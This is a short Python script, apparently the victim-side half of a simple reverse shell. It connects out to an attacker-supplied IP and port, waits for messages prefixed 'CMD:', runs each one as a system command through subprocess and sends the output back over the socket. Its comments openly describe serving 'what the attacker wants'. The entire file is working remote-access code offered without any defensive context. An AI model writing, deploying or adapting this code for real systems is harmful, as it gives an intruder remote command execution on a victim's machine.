import socket
import subprocess
import sys

if len(sys.argv) != 3: # Parsing line arguments to get bind ip and bind port
    print(f"Usage: {sys.argv[0]} BIND_IP BIND_PORT")

BIND_IP = sys.argv[1]

try:
    BIND_PORT = int(sys.argv[2])
except ValueError:
    print("Invalid port")
    sys.exit()

COMMAND_IDENTIFIER = "CMD:"  # Useful to avoid problems with command execution. Just execute what the attacker wants

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

victim_socket.connect((BIND_IP, BIND_PORT))


def handle_command(data):  # Function to handle a command, execute it on the system and send the response back
    if type(data) == bytes:
        data = data.decode()

    if data.startswith(COMMAND_IDENTIFIER):
        command = data.split(COMMAND_IDENTIFIER)[1]

        # Executing system command and storing the command output
        command_splited = command.split(" ")

        try:
            out_command = subprocess.Popen(command_splited, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

            stdout, stderr = out_command.communicate()  # Getting the command output + command errors
        except OSError:
            stdout = "An error ocurred"

        send_response(stdout)


def send_response(data):  # Function to send data to the attacker. For example, the command output
    if type(data) == str:
        data = data.encode()

    victim_socket.send(data)


while True:
    recv_data = victim_socket.recv(1024)
    handle_command(recv_data)
